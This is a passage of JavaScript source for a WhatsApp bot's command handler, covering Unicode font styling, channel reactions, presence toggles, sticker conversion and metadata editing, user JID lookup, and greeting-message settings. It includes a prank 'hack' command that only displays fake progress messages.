        14:{"0":"0","1":"1","2":"2","3":"3","4":"4","5":"5","6":"6","7":"7","8":"8","9":"9","a":"₳","b":"฿","c":"₵","d":"Đ","e":"Ɇ","f":"₣","g":"₲","h":"Ⱨ","i":"ł","j":"J","k":"₭","l":"Ⱡ","m":"₥","n":"₦","o":"Ø","p":"₱","q":"Q","r":"Ɽ","s":"₴","t":"₮","u":"Ʉ","v":"V","w":"₩","x":"Ӿ","y":"Ɏ","z":"Ⱬ","A":"₳","B":"฿","C":"₵","D":"Đ","E":"Ɇ","F":"₣","G":"₲","H":"Ⱨ","I":"ł","J":"J","K":"₭","L":"Ⱡ","M":"₥","N":"₦","O":"Ø","P":"₱","Q":"Q","R":"Ɽ","S":"₴","T":"₮","U":"Ʉ","V":"V","W":"₩","X":"Ӿ","Y":"Ɏ","Z":"Ⱬ" },
        15:{"0":"0","1":"1","2":"2","3":"3","4":"4","5":"5","6":"6","7":"7","8":"8","9":"9","a":"å","b":"ß","c":"¢","d":"Ð","e":"ê","f":"£","g":"g","h":"h","i":"ï","j":"j","k":"k","l":"l","m":"m","n":"ñ","o":"ð","p":"þ","q":"q","r":"r","s":"§","t":"†","u":"µ","v":"v","w":"w","x":"x","y":"¥","z":"z","A":"Ä","B":"ß","C":"Ç","D":"Ð","E":"È","F":"£","G":"G","H":"H","I":"Ì","J":"J","K":"K","L":"L","M":"M","N":"ñ","O":"Ö","P":"þ","Q":"Q","R":"R","S":"§","T":"†","U":"Ú","V":"V","W":"W","X":"×","Y":"¥","Z":"Z" },
        16:{"0":"0","1":"1","2":"2","3":"3","4":"4","5":"5","6":"6","7":"7","8":"8","9":"9","a":"α","b":"в","c":"¢","d":"∂","e":"є","f":"ƒ","g":"g","h":"н","i":"ι","j":"נ","k":"к","l":"ℓ","m":"м","n":"η","o":"σ","p":"ρ","q":"q","r":"я","s":"ѕ","t":"т","u":"υ","v":"ν","w":"ω","x":"χ","y":"у","z":"z","A":"α","B":"в","C":"¢","D":"∂","E":"є","F":"ƒ","G":"g","H":"н","I":"ι","J":"נ","K":"к","L":"ℓ","M":"м","N":"η","O":"σ","P":"ρ","Q":"q","R":"я","S":"ѕ","T":"т","U":"υ","V":"ν","W":"ω","X":"χ","Y":"у","Z":"z" },
        17:{"0":"⊘","1":"𝟙","2":"ϩ","3":"Ӡ","4":"५","5":"Ƽ","6":"Ϭ","7":"7","8":"𝟠","9":"९","a":"ą","b":"ҍ","c":"ç","d":"ժ","e":"ҽ","f":"ƒ","g":"ց","h":"հ","i":"ì","j":"ʝ","k":"ҟ","l":"Ӏ","m":"ʍ","n":"ղ","o":"օ","p":"ք","q":"զ","r":"ɾ","s":"ʂ","t":"է","u":"մ","v":"ѵ","w":"ա","x":"×","y":"վ","z":"Հ","A":"Ⱥ","B":"β","C":"↻","D":"Ꭰ","E":"Ɛ","F":"Ƒ","G":"Ɠ","H":"Ƕ","I":"į","J":"ل","K":"Ҡ","L":"Ꝉ","M":"Ɱ","N":"ហ","O":"ට","P":"φ","Q":"Ҩ","R":"འ","S":"Ϛ","T":"Ͳ","U":"Ա","V":"Ỽ","W":"చ","X":"ჯ","Y":"Ӌ","Z":"ɀ" },
        18:{"0":"0","1":"1","2":"2","3":"3","4":"4","5":"5","6":"6","7":"7","8":"8","9":"9","a":"Λ","b":"B","c":"ᄃ","d":"D","e":"Σ","f":"F","g":"G","h":"Ή","i":"I","j":"J","k":"K","l":"ᄂ","m":"M","n":"П","o":"Ө","p":"P","q":"Q","r":"Я","s":"Ƨ","t":"Ƭ","u":"Ц","v":"V","w":"Щ","x":"X","y":"Y","z":"Z","A":"Λ","B":"B","C":"ᄃ","D":"D","E":"Σ","F":"F","G":"G","H":"Ή","I":"I","J":"J","K":"K","L":"ᄂ","M":"M","N":"П","O":"Ө","P":"P","Q":"Q","R":"Я","S":"Ƨ","T":"Ƭ","U":"Ц","V":"V","W":"Щ","X":"X","Y":"Y","Z":"Z" },
        19:{"0":"₀","1":"₁","2":"₂","3":"₃","4":"₄","5":"₅","6":"₆","7":"₇","8":"₈","9":"₉","a":"ₐ","b":"b","c":"c","d":"d","e":"ₑ","f":"f","g":"g","h":"ₕ","i":"ᵢ","j":"ⱼ","k":"ₖ","l":"ₗ","m":"ₘ","n":"ₙ","o":"ₒ","p":"ₚ","q":"q","r":"ᵣ","s":"ₛ","t":"ₜ","u":"ᵤ","v":"ᵥ","w":"w","x":"ₓ","y":"y","z":"z","A":"ₐ","B":"B","C":"C","D":"D","E":"ₑ","F":"F","G":"G","H":"ₕ","I":"ᵢ","J":"ⱼ","K":"ₖ","L":"ₗ","M":"ₘ","N":"ₙ","O":"ₒ","P":"ₚ","Q":"Q","R":"ᵣ","S":"ₛ","T":"ₜ","U":"ᵤ","V":"ᵥ","W":"W","X":"ₓ","Y":"Y","Z":"Z","+":"₊","-":"₋",":":"₌","(":"₍",")":"₎" },
        20:{"0":"⁰","1":"¹","2":"²","3":"³","4":"⁴","5":"⁵","6":"⁶","7":"⁷","8":"⁸","9":"⁹","a":"ᵃ","b":"ᵇ","c":"ᶜ","d":"ᵈ","e":"ᵉ","f":"ᶠ","g":"ᵍ","h":"ʰ","i":"ⁱ","j":"ʲ","k":"ᵏ","l":"ˡ","m":"ᵐ","n":"ⁿ","o":"ᵒ","p":"ᵖ","q":"q","r":"ʳ","s":"ˢ","t":"ᵗ","u":"ᵘ","v":"ᵛ","w":"ʷ","x":"ˣ","y":"ʸ","z":"ᶻ","A":"ᴬ","B":"ᴮ","C":"ᶜ","D":"ᴰ","E":"ᴱ","F":"ᶠ","G":"ᴳ","H":"ᴴ","I":"ᴵ","J":"ᴶ","K":"ᴷ","L":"ᴸ","M":"ᴹ","N":"ᴺ","O":"ᴼ","P":"ᴾ","Q":"Q","R":"ᴿ","S":"ˢ","T":"ᵀ","U":"ᵁ","V":"ⱽ","W":"ᵂ","X":"ˣ","Y":"ʸ","Z":"ᶻ","+":"⁺","-":"⁻",":":"⁼","(":"⁽",")":"⁾" },
        21:{"0":"0","1":"1","2":"2","3":"3","4":"4","5":"5","6":"6","7":"7","8":"8","9":"9","a":"ค","b":"๒","c":"ς","d":"๔","e":"є","f":"Ŧ","g":"ﻮ","h":"ђ","i":"เ","j":"ן","k":"к","l":"ɭ","m":"๓","n":"ภ","o":"๏","p":"ק","q":"ợ","r":"г","s":"ร","t":"Շ","u":"ย","v":"ש","w":"ฬ","x":"א","y":"ץ","z":"չ","A":"ค","B":"๒","C":"ς","D":"๔","E":"є","F":"Ŧ","G":"ﻮ","H":"ђ","I":"เ","J":"ן","K":"к","L":"ɭ","M":"๓","N":"ภ","O":"๏","P":"ק","Q":"ợ","R":"г","S":"ร","T":"Շ","U":"ย","V":"ש","W":"ฬ","X":"א","Y":"ץ","Z":"չ" },
        22:{"0":"𝟘","1":"𝟙","2":"𝟚","3":"𝟛","4":"𝟜","5":"𝟝","6":"𝟞","7":"𝟟","8":"𝟠","9":"𝟡","a":"𝕒","b":"𝕓","c":"𝕔","d":"𝕕","e":"𝕖","f":"𝕗","g":"𝕘","h":"𝕙","i":"𝕚","j":"𝕛","k":"𝕜","l":"𝕝","m":"𝕞","n":"𝕟","o":"𝕠","p":"𝕡","q":"𝕢","r":"𝕣","s":"𝕤","t":"𝕥","u":"𝕦","v":"𝕧","w":"𝕨","x":"𝕩","y":"𝕪","z":"𝕫","A":"𝔸","B":"𝔹","C":"ℂ","D":"𝔻","E":"𝔼","F":"𝔽","G":"𝔾","H":"ℍ","I":"𝕀","J":"𝕁","K":"𝕂","L":"𝕃","M":"𝕄","N":"ℕ","O":"𝕆","P":"ℙ","Q":"ℚ","R":"ℝ","S":"𝕊","T":"𝕋","U":"𝕌","V":"𝕍","W":"𝕎","X":"𝕏","Y":"𝕐","Z":"ℤ" },
        23:{"0":"0","1":"1","2":"2","3":"3","4":"4","5":"5","6":"6","7":"7","8":"8","9":"9","a":"𝖆","b":"𝖇","c":"𝖈","d":"𝖉","e":"𝖊","f":"𝖋","g":"𝖌","h":"𝖍","i":"𝖎","j":"𝖏","k":"𝖐","l":"𝖑","m":"𝖒","n":"𝖓","o":"𝖔","p":"𝖕","q":"𝖖","r":"𝖗","s":"𝖘","t":"𝖙","u":"𝖚","v":"𝖛","w":"𝖜","x":"𝖝","y":"𝖞","z":"𝖟","A":"𝕬","B":"𝕭","C":"𝕮","D":"𝕯","E":"𝕰","F":"𝕱","G":"𝕲","H":"𝕳","I":"𝕴","J":"𝕵","K":"𝕶","L":"𝕷","M":"𝕸","N":"𝕹","O":"𝕺","P":"𝕻","Q":"𝕼","R":"𝕽","S":"𝕾","T":"𝕿","U":"𝖀","V":"𝖁","W":"𝖂","X":"𝖃","Y":"𝖄","Z":"𝖅" },
        24:{q:"🆀",w:"🆆",e:"🅴",r:"🆁",t:"🆃",y:"🆈",u:"🆄",i:"🅸",o:"🅾",p:"🅿",a:"🅰",s:"🆂",d:"🅳",f:"🅵",g:"🅶",h:"🅷",j:"🅹",k:"🅺",l:"🅻",z:"🆉",x:"🆇",c:"🅲",v:"🆅",b:"🅱",n:"🅽",m:"🅼"}, 
        25:{"0":"0","1":"1","2":"2","3":"3","4":"4","5":"5","6":"6","7":"7","8":"8","9":"9","a":"𝓪","b":"𝓫","c":"𝓬","d":"𝓭","e":"𝓮","f":"","g":"𝓰","h":"𝓱","i":"𝓲","j":"𝓳","k":"𝓴","l":"𝓵","m":"𝓶","n":"𝓷","o":"𝓸","p":"𝓹","q":"𝓺","r":"𝓻","s":"𝓼","t":"𝓽","u":"𝓾","v":"𝓿","w":"𝔀","x":"𝔁","y":"𝔂","z":"𝔃","A":"𝓐","B":"𝓑","C":"𝓒","D":"𝓓","E":"𝓔","F":"𝓕","G":"𝓖","H":"𝓗","I":"𝓘","J":"𝓙","K":"𝓚","L":"𝓛","M":"𝓜","N":"𝓝","O":"𝓞","P":"𝓟","Q":"𝓠","R":"𝓡","S":"𝓢","T":"𝓣","U":"𝓤","V":"𝓥","W":"𝓦","X":"𝓧","Y":"𝓨","Z":"𝓩" },
        26:{"a":"𝔞","b":"𝔟","c":"𝔠","d":"𝔡","e":"𝔢","f":"𝔣","g":"𝔤","h":"𝔥","i":"𝔦","j":"𝔧","k":"𝔨","l":"𝔩","m":"𝔪","n":"𝔫","o":"𝔬","p":"𝔭","q":"𝔮","r":"𝔯","s":"𝔰","t":"𝔱","u":"𝔲","v":"𝔳","w":"𝔴","x":"𝔵","y":"𝔶","z":"𝔷","A":"𝔄","B":"𝔅","C":"ℭ","D":"𝔇","E":"𝔈","F":"𝔉","G":"𝔊","H":"ℌ","I":"ℑ","J":"𝔍","K":"𝔎","L":"𝔏","M":"𝔐","N":"𝔑","O":"𝔒","P":"𝔓","Q":"𝔔","R":"ℜ","S":"𝔖","T":"𝔗","U":"𝔘","V":"𝔙","W":"𝔚","X":"𝔛","Y":"𝔜","Z":"ℨ" },
        27:{"`":"`","1":"１","2":"２","3":"３","4":"４","5":"５","6":"６","7":"７","8":"８","9":"９","0":"０","-":"－",":":"＝","~":"~","!":"！","@":"＠","#":"＃","$":"＄","%":"％","^":"^","&":"＆","*":"＊","(":"（",")":"）","_":"_","+":"＋","q":"ｑ","w":"ｗ","e":"ｅ","r":"ｒ","t":"ｔ","y":"ｙ","u":"ｕ","i":"ｉ","o":"ｏ","p":"ｐ","[":"[","]":"]","\\":"\\","Q":"Ｑ","W":"Ｗ","E":"Ｅ","R":"Ｒ","T":"Ｔ","Y":"Ｙ","U":"Ｕ","I":"Ｉ","O":"Ｏ","P":"Ｐ","{":"{","}":"}","|":"|","a":"ａ","s":"ｓ","d":"ｄ","f":"ｆ","g":"ｇ","h":"ｈ","j":"ｊ","k":"ｋ","l":"ｌ",";":"；","'":"＇","A":"Ａ","S":"Ｓ","D":"Ｄ","F":"Ｆ","G":"Ｇ","H":"Ｈ","J":"Ｊ","K":"Ｋ","L":"Ｌ",":":"：","\"":"\"","z":"ｚ","x":"ｘ","c":"ｃ","v":"ｖ","b":"ｂ","n":"ｎ","m":"ｍ",",":"，",".":"．","/":"／","Z":"Ｚ","X":"Ｘ","C":"Ｃ","V":"Ｖ","B":"Ｂ","N":"Ｎ","M":"Ｍ","<":"<",">":">","?":"？"},
        28:{"a":"ᴀ","b":"ʙ","c":"ᴄ","d":"ᴅ","e":"ᴇ","f":"ғ","g":"ɢ","h":"ʜ","i":"ɪ","j":"ᴊ","k":"ᴋ","l":"ʟ","m":"ᴍ","n":"ɴ","o":"ᴏ","p":"ᴘ","q":"ǫ","r":"ʀ","s":"s","t":"ᴛ","u":"ᴜ","v":"ᴠ","w":"ᴡ","x":"x","y":"ʏ","z":"ᴢ","A":"ᴀ","B":"ʙ","C":"ᴄ","D":"ᴅ","E":"ᴇ","F":"ғ","G":"ɢ","H":"ʜ","I":"ɪ","J":"ᴊ","K":"ᴋ","L":"ʟ","M":"ᴍ","N":"ɴ","O":"ᴏ","P":"ᴘ","Q":"ǫ","R":"ʀ","S":"s","T":"ᴛ","U":"ᴜ","V":"ᴠ","W":"ᴡ","X":"x","Y":"ʏ","Z":"ᴢ" },
        29:{"a":"𝒂","b":"𝒃","c":"𝒄","d":"𝒅","e":"𝒆","f":"𝒇","g":"𝒈","h":"𝒉","i":"𝒊","j":"𝒋","k":"𝒌","l":"𝒍","m":"𝒎","n":"𝒏","o":"𝒐","p":"𝒑","q":"𝒒","r":"𝒓","s":"𝒔","t":"𝒕","u":"𝒖","v":"𝒗","w":"𝒘","x":"𝒙","y":"𝒚","z":"𝒛","A":"𝐴","B":"𝐵","C":"𝐶","D":"𝐷","E":"𝐸","F":"𝐹","G":"𝐺","H":"𝐻","I":"𝐼","J":"𝐽","K":"𝐾","L":"𝐿","M":"𝑀","N":"𝑁","O":"𝑂","P":"𝑃","Q":"𝑄","R":"𝑅","S":"𝑆","T":"𝑇","U":"𝑈","V":"𝑉","W":"𝑊","X":"𝑋","Y":"𝑌","Z":"𝑍" },
        30:{"a":"𝛥","b":"𝐵","c":"𝐶","d":"𝐷","e":"𝛯","f":"𝐹","g":"𝐺","h":"𝛨","i":"𝛪","j":"𝐽","k":"𝛫","l":"𝐿","m":"𝛭","n":"𝛮","o":"𝛩","p":"𝛲","q":"𝑄","r":"𝑅","s":"𝑆","t":"𝑇","u":"𝑈","v":"𝛻","w":"𝑊","x":"𝛸","y":"𝑌","z":"𝛧","A":"𝛥","B":"𝐵","C":"𝐶","D":"𝐷","E":"𝛯","F":"𝐹","G":"𝐺","H":"𝛨","I":"𝛪","J":"𝐽","K":"𝛫","L":"𝐿","M":"𝛭","N":"𝛮","O":"𝛩","P":"𝛲","Q":"𝑄","R":"𝑅","S":"𝑆","T":"𝑇","U":"𝑈","V":"𝛻","W":"𝑊","X":"𝛸","Y":"𝑌","Z":"𝛧"},
        31:{"A":"𝚫","B":"𝚩","C":"𝐂","D":"𝐃","E":"𝚵","F":"𝐅","G":"𝐆","H":"𝚮","I":"𝚰","J":"𝐉","K":"𝐊","L":"𝐋","M":"𝚳","N":"𝚴","O":"𝚯","P":"𝚸","Q":"𝐐","R":"𝚪","S":"𝐒","T":"𝚻","U":"𝐔","V":"𝛁","W":"𝐖","X":"𝚾","Y":"𝐘","Z":"𝚭","a":"𝚫","b":"𝚩","c":"𝐂","d":"𝐃","e":"𝚵","f":"𝐅","g":"𝐆","h":"𝚮","i":"𝚰","j":"𝐉","k":"𝐊","l":"𝐋","m":"𝚳","n":"𝚴","o":"𝚯","p":"𝚸","q":"𝐐","r":"𝚪","s":"𝐒","t":"𝚻","u":"𝐔","v":"𝛁","w":"𝐖","x":"𝚾","y":"𝐘","z":"𝚭"},	
        32:{"A":"ꪖ","B":"᥇","C":"ᥴ","D":"ᦔ","E":"ꫀ","F":"ᠻ","G":"ᧁ","H":"ꫝ","I":"ﺃ","J":"꠹","K":"ᛕ","L":"ꪶ","M":"ꪑ","N":"ꪀ","O":"ꪮ","P":"ᜣ","Q":"ꪇ","R":"᥅","S":"ᦓ","T":"ꪻ","U":"ꪊ","V":"ꪜ","W":"᭙","X":"᥊","Y":"ꪗ","Z":"ɀ","a":"ꪖ","b":"᥇","c":"ᥴ","d":"ᦔ","e":"ꫀ","f":"ᠻ","g":"ᧁ","h":"ꫝ","i":"ﺃ","j":"꠹","k":"ᛕ","l":"ꪶ","m":"ꪑ","n":"ꪀ","o":"ꪮ","p":"ᜣ","q":"ꪇ","r":"᥅","s":"ᦓ","t":"ꪻ","u":"ꪊ","v":"ꪜ","w":"᭙","x":"᥊","y":"ꪗ","z":"ɀ"},
        33:{"ഒ":"ඉ","എ":"ᬤ","ഉ":"ຂ","ക":"ᤌ‌","ഗ":"ꪭ","ത":"ꫧ","ന":"ღ͢","മ്പ":"൩","വ":"൨","യ":"ᨨ͓","ര":"ᰍ","ി":"᭄","ീ":"ꪻ","ാ":"ꫂ","(":"ꪶ","ു":"⫰","‌്":"᷃","്":"ັ","ർ":"൪","ണ":"𑇥̅","ട":"ຮ","ട്ട":"ჴ","െ":"൭͛","ം":"◕","ഞ":"ൡ̅","േ":"ല","ൽ":"ᰢ","ന്ന":"ꢳ"}
    };

    const applyStyle = (map, inputText) => {
        let result = "";
        for (let char of inputText) {
            if (map[char] !== undefined) {
                result += map[char];
            } else if (map[char.toLowerCase()] !== undefined) {
                result += map[char.toLowerCase()];
            } else {
                result += char;
            }
        }
        return result;
    };

    if (!text) {
        let stylesList = Object.keys(fancy).filter(e => e.length < 3);
        let msg = `✨ *ZORO MD FANCY FONTS* ✨\n\n*Format:* ${prefix}font [number] [text]\n*Example:* ${prefix}font 10 Sabir\n\n*Styles Preview:*\n`;
        
        stylesList.forEach((style) => {
            let num = parseInt(style) + 1;
            let preview = (style == "33") ? "Malayalam font" : applyStyle(fancy[style], "Zoro MD");
            msg += `\`${num}.\` ${preview}\n`;
        });
        return await SYHaTeReplay(msg);
    }

    const args = text.trim().split(/\s+/);
    const numStr = args[0];
    const actualText = args.slice(1).join(' ');

    const styleIndex = parseInt(numStr);

    if (isNaN(styleIndex) || !actualText || !fancy[styleIndex]) {
        return await SYHaTeReplay(`❌ *Invalid input!*\nUse: ${prefix}font [1-34] [text]\n\nExample: ${prefix}font 10 Sabir`);
    }

    let resultText = applyStyle(fancy[styleIndex], actualText);
    await SYHaTeReplay(resultText);
}

if (SYHaTeS7 === 'reactch') {
    if (!text) {
        return await SYHaTeReplay(`Usage: ${prefix}reactch link_channel text\nExample: ${prefix}reactch https://whatsapp.com/channel/0029VaG9VfPKWEKk1rxTQD20/18383 hello`);
    }

    if (!text.startsWith("https://whatsapp.com/channel/")) {
        return await SYHaTeReplay("❌ *Link invalid!*");
    }

    const s7Reaction = {
        a: '🅐', b: '🅑', c: '🅒', d: '🅓', e: '🅔', f: '🅕', g: '🅖', h: '🅗', i: '🅘', j: '🅙',
        k: '🅚', l: '🅛', m: '🅜', n: '🅝', o: '🅞', p: '🅟', q: '🅠', r: '🅡', s: '🅢', t: '🅣',
        u: '🅤', v: '🅥', w: '🅦', x: '🅧', y: '🅨', z: '🅩',
        '0': '⓿', '1': '➊', '2': '➋', '3': '➌', '4': '➍', '5': '➎', '6': '➏', '7': '➐', '8': '➑', '9': '➒'
    };

    const args = text.split(' ');
    const link = args[0];
    const emojiInput = args.slice(1).join(' ').toLowerCase();

    if (!emojiInput) return await SYHaTeReplay("❌ *Please provide text for reaction!*");

    const emoji = emojiInput.split('').map(c => {
        if (c === ' ') return '―';
        return s7Reaction[c] || c;
    }).join('');

    try {
        const channelId = link.split('/')[4];
        const messageId = link.split('/')[5];

        const res = await SYxS7.newsletterMetadata("invite", channelId);
        
        await SYxS7.newsletterReactMessage(res.id, messageId, emoji);
        
        return await SYHaTeReplay(`✅ *Reaction Sent!* \n*Channel:* ${res.name}\n*Emoji:* ${emoji}`);

    } catch (e) {
        log('error', 'REACTCH', e.message);
        return await SYHaTeReplay("❌ *Failed to send reaction.* Check link or bot permissions.");
    }
}

if (SYHaTeS7 === 'autotyping') {
    const botNumberOnly = (SYxS7.user.id || '').split(':')[0].split('@')[0];
    const dbKey = botNumberOnly + '@s.whatsapp.net';
    if (!db[dbKey]) db[dbKey] = {};
    if (!db[dbKey].presence_settings) db[dbKey].presence_settings = { typing: false, recording: false };

    const args = text.split(' ');
    const action = args[0]?.toLowerCase();

    if (action === 'on') {
        if (db[dbKey].presence_settings.recording) {
            return await SYHaTeReplay("❌ *Auto-Recording is already active!* Please turn it off first.");
        }
        db[dbKey].presence_settings.typing = true;
        saveDB(db);
        return await SYHaTeReplay("📝 *Auto-Typing:* ENABLED");
    } else if (action === 'off') {
        db[dbKey].presence_settings.typing = false;
        saveDB(db);
        return await SYHaTeReplay("📝 *Auto-Typing:* DISABLED");
    } else {
        return await SYHaTeReplay(`Use:\n> ${prefix}autotyping on\n> ${prefix}autotyping off`);
    }
}

if (SYHaTeS7 === 'autorecording') {
    const botNumberOnly = (SYxS7.user.id || '').split(':')[0].split('@')[0];
    const dbKey = botNumberOnly + '@s.whatsapp.net';
    if (!db[dbKey]) db[dbKey] = {};
    if (!db[dbKey].presence_settings) db[dbKey].presence_settings = { typing: false, recording: false };

    const args = text.split(' ');
    const action = args[0]?.toLowerCase();

    if (action === 'on') {
        if (db[dbKey].presence_settings.typing) {
            return await SYHaTeReplay("❌ *Auto-Typing is already active!* Please turn it off first.");
        }
        db[dbKey].presence_settings.recording = true;
        saveDB(db);
        return await SYHaTeReplay("🎙️ *Auto-Recording:* ENABLED");
    } else if (action === 'off') {
        db[dbKey].presence_settings.recording = false;
        saveDB(db);
        return await SYHaTeReplay("🎙️ *Auto-Recording:* DISABLED");
    } else {
        return await SYHaTeReplay(`Use:\n> ${prefix}autorecording on\n> ${prefix}autorecording off`);
    }
}

if (SYHaTeS7 === 'toimage' || SYHaTeS7 === 'toimg') {
    const contextInfo = S7.message?.extendedTextMessage?.contextInfo;
    const quotedMessage = contextInfo?.quotedMessage;
    
    if (!quotedMessage) return await SYHaTeReplay("Quote a sticker to convert!");
    if (!quotedMessage.stickerMessage) return await SYHaTeReplay("This is not a sticker!");

    const { downloadContentFromMessage } = require('@whiskeysockets/baileys');
    const sharp = require('sharp');

    try {
        const stream = await downloadContentFromMessage(quotedMessage.stickerMessage, 'image');
        let buffer = Buffer.from([]);
        for await (const chunk of stream) {
            buffer = Buffer.concat([buffer, chunk]);
        }

        const convertedBuffer = await sharp(buffer)
            .png()
            .toBuffer();

        await SYxS7.sendMessage(from, { image: convertedBuffer, caption: "" }, { quoted: S7 });

    } catch (e) {
        console.log(e);
        return await SYHaTeReplay("Error processing request. Make sure 'sharp' module is installed.");
    }
}

if (SYHaTeS7 === 'sname') {
    const contextInfo = S7.message?.extendedTextMessage?.contextInfo;
    const quotedMessage = contextInfo?.quotedMessage;
    
    if (!quotedMessage) return await SYHaTeReplay("Quote a sticker to change metadata!");
    if (!quotedMessage.stickerMessage) return await SYHaTeReplay("This is not a sticker!");
    if (!text) return await SYHaTeReplay(`Provide a name!\nExample: ${prefix}sname sabir7718`);

    const { downloadContentFromMessage } = require('@whiskeysockets/baileys');
    const webp = require('node-webpmux');

    try {
        const stream = await downloadContentFromMessage(quotedMessage.stickerMessage, 'image');
        let buffer = Buffer.from([]);
        for await (const chunk of stream) {
            buffer = Buffer.concat([buffer, chunk]);
        }

        const img = new webp.Image();
        await img.load(buffer);

        const json = {
            "sticker-pack-id": text,
            "sticker-pack-name": text,
            "sticker-pack-publisher": "",
            "emojis": ["💀"]
        };

        const exifHeader = Buffer.from([0x49, 0x49, 0x2A, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0x41, 0x57, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x16, 0x00, 0x00, 0x00]);
        const jsonBuffer = Buffer.from(JSON.stringify(json), "utf-8");
        const exif = Buffer.concat([exifHeader, jsonBuffer]);
        exif.writeUIntLE(jsonBuffer.length, 14, 4);

        img.exif = exif;
        const resultBuffer = await img.save(null);

        await SYxS7.sendMessage(from, { sticker: resultBuffer }, { quoted: S7 });
    } catch (e) {
        console.log(e);
        return await SYHaTeReplay("Failed to modify sticker metadata.");
    }
}


if (SYHaTeS7 === 'hack') {
    const delay = ms => new Promise(res => setTimeout(res, ms));
    
    const frames = [
        "📡 *[SYSTEM]*: Initializing hacking protocol...",
        "🔏 *[FIREWALL]*: Bypassing local security layers...",
        "💾 *[SYSTEM]*: Accessing core servers...",
        "💉 *[EXPLOIT]*: Injecting malicious payloads...",
        "🛡️ *[SECURITY]*: Anti-virus protocol bypassed successfully.",
        "📊 *[PROGRESS]*: Fetching personal database storage... [35%]",
        "📊 *[PROGRESS]*: Fetching personal database storage... [72%]",
        "📊 *[PROGRESS]*: Fetching personal database storage... [100%]",
        "🔑 *[DECRYPT]*: Cracking system password credentials...",
        "💀 *[COMPLETED]*: HACK COMPLETED SUCCESSFULLY! Device is now controlled by Zoro MD."
    ];

    let currentMsg = await SYxS7.sendMessage(from, { text: frames[0] }, { quoted: S7 });

    for (let i = 1; i < frames.length; i++) {
        await delay(1200);
        await SYxS7.sendMessage(from, { 
            text: frames[i], 
            edit: currentMsg.key 
        });
    }
}


                                if (SYHaTeS7 === 'getjid') {
                    const quoted = S7.message?.extendedTextMessage?.contextInfo;
                    const SABIR7718 = quoted ? quoted.participant : sender;                  
                    if (!SABIR7718) return await SYHaTeReplay("❌ *JID could not find!*");     
                    return await SYHaTeReplay(`📌 *User JID:* ${SABIR7718}`);
                }
                if (SYHaTeS7 === 'getlid') {
                    const quoted = S7.message?.extendedTextMessage?.contextInfo;
                    const SABIR7718 = quoted ? quoted.participant : sender;              
                    if (!SABIR7718) return await SYHaTeReplay("❌ *LID/ID could not find!*");
                    return await SYHaTeReplay(`📌 *User LID:* ${SABIR7718}`);
                }
                
                    if (SYHaTeS7 === 'mention' || SYHaTeS7 === 'admention') {
                    const fs = require('fs');
                    if (!isGroup) return await SYHaTeReplay(onlygc);

                    let target = S7.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0] || S7.message?.extendedTextMessage?.contextInfo?.participant;
                    
                    if (!target && args[0]) {
                        target = args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net';
                    }

                    if (!target) return await SYHaTeReplay(`👤 *𝚉𝙾𝚁𝙾 𝙼𝙴𝙽𝚃𝙸𝙾𝙽*\n\nPlease mention a user or reply to their message.`);

                    await SYxS7.sendMessage(from, { react: { text: '🎵', key: S7.key } });

                    try {
                        let ppUrl;
                        try {
                            ppUrl = await SYxS7.profilePictureUrl(target, 'image');
                        } catch {
                            ppUrl = "https://i.top4top.io/p_3664firq70.jpg";
                        }

                        if (!fs.existsSync('./SY/song.mp3')) return await SYHaTeReplay("❌ *Error:* File not found at ./SY/song.mp3");
                        
                        const audioBuffer = fs.readFileSync('./SY/song.mp3');

                        const playbackControls = "⇆ㅤ ||◁ㅤ❚❚ㅤ▷||ㅤ ↻";
                        const progressBar = "01:43 ━━━━●───── 03:50";
                        const footerLink = "🔗 instagram.com/sayan_dev";

                        await SYHaTeReplay({
                            audio: audioBuffer,
                            mimetype: 'audio/mpeg',
                            ptt: true,
                            contextInfo: {
                                mentionedJid: [target],
                                externalAdReply: {
                                    title: "𝚉𝙾𝚁𝙾 𝙼𝚄𝚂𝙸𝙲 𝙿𝙻𝙰𝚈𝙴𝚁",
                                    body: `${playbackControls}\n${progressBar}\n${footerLink}`,
                                    thumbnailUrl: ppUrl,
                                    sourceUrl: "https://github.com/Sayan",
                                    mediaType: 1,
                                    showAdAttribution: true
                                }
                            }
                        });

                    } catch (e) {
                        console.error(e);
                        await SYHaTeReplay("❌ *Error:* Failed to play audio via SYHaTeReplay.");
                    }
                    return;
                }
              

if (SYHaTeS7 === 'gmsg') {
    if (!isOwner) return await SYHaTeReplay(owneronly);

    if (!db[botNumber]) db[botNumber] = {};
    if (!db[botNumber].gmsg || !Array.isArray(db[botNumber].gmsg.messages)) {
        db[botNumber].gmsg = { messages: [] };
    }

    const action = args[0]?.toLowerCase();

    if (!action) {
        return await SYHaTeReplay(`*ＧＲＥＥＴＩＮＧ  ＳＥＴＴＩＮＧＳ*\n\n*Commands:*\n> ${prefix}gmsg addtext [message]\n> ${prefix}gmsg addmedia [reply to media with optional caption]\n> ${prefix}gmsg clear\n> ${prefix}gmsg status`);
    }

    if (action === 'addtext') {
        const textContent = args.slice(1).join(' ');
        if (!textContent) return await SYHaTeReplay("*Error:* Provide text content!");

        db[botNumber].gmsg.messages.push({
            enabled: true,
            type: 'text',
            content: textContent,
            delay: 1500
        });
        saveDB(db);

        await SYxS7.sendMessage(from, { react: { text: "📝", key: S7.key } });
        return await SYHaTeReplay(`*Added text message to sequence at position:* ${db[botNumber].gmsg.messages.length}`);
    }

    else if (action === 'addmedia') {
        const contextInfo = S7.message?.extendedTextMessage?.contextInfo;
        const quotedMessage = contextInfo?.quotedMessage;

        const isDirectPhoto = S7.message?.imageMessage;
        const isDirectVideo = S7.message?.videoMessage;
        const isDirectAudio = S7.message?.audioMessage;

        const isQuotedPhoto = quotedMessage ? (quotedMessage.imageMessage || quotedMessage.viewOnceMessage?.message?.imageMessage || quotedMessage.viewOnceMessageV2?.message?.imageMessage) : false;
        const isQuotedVideo = quotedMessage ? (quotedMessage.videoMessage || quotedMessage.viewOnceMessage?.message?.videoMessage || quotedMessage.viewOnceMessageV2?.message?.videoMessage) : false;
        const isQuotedAudio = quotedMessage?.audioMessage;

        if (!isDirectPhoto && !isDirectVideo && !isDirectAudio && !isQuotedPhoto && !isQuotedVideo && !isQuotedAudio) {
            return await SYHaTeReplay("*Error:* Reply to or send a media file!");
        }

        let mediaType = '';
        let targetMsg = null;

        if (isDirectPhoto || isQuotedPhoto) {
            mediaType = 'image';
